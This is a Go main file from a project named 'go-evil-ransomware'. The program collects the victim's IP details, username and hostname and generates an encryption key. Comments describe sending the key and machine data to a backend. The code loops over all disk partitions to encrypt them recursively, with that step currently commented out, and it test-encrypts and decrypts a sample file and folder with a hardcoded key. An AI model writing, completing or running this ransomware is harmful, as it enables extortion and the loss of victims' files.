package main

import (
	"fmt"
	go_grab_ip "github.com/PaulDotSH/go-grab-ip"
	"github.com/shirou/gopsutil/disk"
	"go-evil-ransomware/ransom"
	"os"
	"os/user"
)

//TODO: uncheck read only from files if able to do so
//Sends encryption key, computer and ip details to a backend (as JSON)
//Files are decryptable with the same exe when providing the decryption parameters to the process
//Generates a thread for all drives (so encryption is faster)

var IPData go_grab_ip.IPData

func init() {
	//wait until there's internet

}

type RansomData struct {
	IPData       go_grab_ip.IPData
	Key          string
	Username     string
	ComputerName string
}

func main() {
	var data RansomData
	data.IPData = go_grab_ip.AwaitIPData()
	data.Key = ransom.GenerateKey()

	o, _ := user.Current()
	data.Username = o.Username
	hostname, _ := os.Hostname()
	data.ComputerName = hostname

	fmt.Println(data)

	//for each partition, launch a new routine and wait for all to complete
	//because the ransomware will recursively run on /, it will on any partition anyway but not concurrently, think of a way to skip checking already encrypted paths that
	//doesn't affect performance
	partitions, _ := disk.Partitions(false)
	for _, partition := range partitions {
		if ransom.Debug {
			fmt.Println(partition.Mountpoint)
		} else {
			//err := ransom.RecursivelyEncryptDirectory(partition.Mountpoint, []byte(""))
			//if err != nil {
			//	fmt.Println(err)
			//}
		}
	}

	err := ransom.EncryptFile("test.txt", []byte("12345678912345678912345678912345"))
	if err != nil {
		fmt.Println(err)
	}

	err = ransom.DecryptFile("test.txt.evil", []byte("12345678912345678912345678912345"))
	if err != nil {
		fmt.Println(err)
	}

	err = ransom.RecursivelyEncryptDirectory("./test/", []byte("12345678912345678912345678912345"))
	if err != nil {
		fmt.Println(err)
	}

	err = ransom.RecursivelyDecryptDirectory("./test/", []byte("12345678912345678912345678912345"))
	if err != nil {
		fmt.Println(err)
	}
}
